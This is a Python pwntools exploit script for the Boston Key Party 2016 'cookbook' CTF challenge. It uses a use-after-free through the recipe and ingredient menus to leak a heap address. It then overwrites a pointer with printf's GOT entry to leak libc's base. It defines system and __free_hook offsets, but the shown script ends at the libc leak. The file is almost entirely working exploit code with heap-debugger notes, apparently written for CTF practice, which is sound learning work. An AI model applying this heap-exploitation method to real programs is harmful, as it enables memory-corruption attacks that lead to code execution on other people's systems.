#
# Boston Key Party 2016 pwn cookbook
#

# socat TCP-LISTEN:8888,reuseaddr,fork 'SYSTEM:./inst_prof'

import re
import ctypes
from pwn import *

PRINTF_OFFSET = 0x49670
SYSTEM_OFFSET = 0x3ada0
FREE_HOOK_OFFSET = 0x71476 + 0x140b8a - 0x9c

#r = remote('localhost', 8888)

# b *0x8048a42 # main_menu
# b *0x8049199 # create_recipe
r = process('./cookbook',)
#gdb.attach(r, '''
#'''
#)

b = ELF('./cookbook')
libc = ELF('/lib/x86_64-linux-gnu/libc.so.6')
context.arch = b.arch
context.log_level = 'info'


# use-after-free:
# 
# create a stale pointer
# 
# add new ingredients 
#
# overwrite a pointer

def stou(i):
    return ctypes.c_uint32(i).value

def add_leak(addr):
    r.sendline('c')
    r.sendline('n')
    r.sendline('g')
    r.sendline('babo')

    r.sendline('d') # create a stale pointer
    r.sendline('q')

    r.sendline('a') # add ingredient
    r.sendline('n')
    r.sendline('g')
    r.sendline('AAAA1111')
    r.sendline('e')
    r.sendline('q')

    r.sendline('c')
    r.sendline('g')
    r.sendline('AAAABBBBCCCC' + p32(addr) + p32(0)) # overwrite a pointer
    r.sendline('q')
    
def parse_ingredient():
    r.clean()
    r.sendline('l')
    resp = r.recv()

    print resp

    li = resp.split('------')
    last = li[-2]
    m = re.search("calories: ([ +-]\d+)", last)

    return stou(int(m.groups()[0])) 

if __name__ == "__main__":

    r.recvuntil("what's your name?")
    r.sendline('babo')

    # leak heap address
    r.sendline('c')

# 'n' will alloc CURRENT_RECIPE structure (4 bytes + 4 bytes + ...)
    r.sendline('n') # alloc 0x40c bytes (which is too big for fastbin)
    r.sendline('a') # alloc two chunks (ingredient_ptr & howmany)
    r.sendline('basil')
    r.sendline('1')
    r.sendline('d') # free()

# free() overwrite the first two dwords with pointers in libc which point the last chunk

# pwndbg> x/16wx 0x804f2b0 
# 0x804f2b0:      0xf7fb77b0      0xf7fb77b0      0x00000000      0x00000000
# pwndbg> x/16wx 0xf7fb77b0
# 0xf7fb77b0 <main_arena+48>:     0x0804f718      0x00000000      0x0804f2a8      0x0804f2a8
#
# 0x804f718 PREV_INUSE {
#   prev_size = 0,
#   size = 129321,
#   fd = 0x0,
#   bk = 0x0,
#   fd_nextsize = 0x0,
#   bk_nextsize = 0x0
# }

# 'p' will leak the 0x0804f718

    r.clean()
    r.sendline('p')
    resp = r.recv()
    log.info("3th line: %s" % resp.split("\n")[3])
    LEAKED_HEAP_ADDR = int(resp.split("\n")[3].split("-")[0])
    log.info("Leaked Heap Address: 0x%x" % LEAKED_HEAP_ADDR)

    add_leak(b.got['printf'])
    leaked = parse_ingredient()
    log.info("printf@GOT: 0x%x => 0x%x" % (b.got['printf'], leaked))

    LIBC = leaked - PRINTF_OFFSET
    log.info("LIBC: 0x%x" % LIBC)

    pause()
